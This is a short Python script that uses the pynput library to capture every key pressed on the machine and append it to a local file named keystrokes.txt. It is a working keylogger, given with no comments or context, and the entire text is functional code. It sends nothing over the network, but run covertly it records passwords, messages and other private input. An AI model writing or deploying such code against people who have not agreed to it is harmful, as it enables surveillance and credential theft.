from pynput import keyboard

def on_press(key):
    with open("keystrokes.txt", "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            log.write(f"{key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
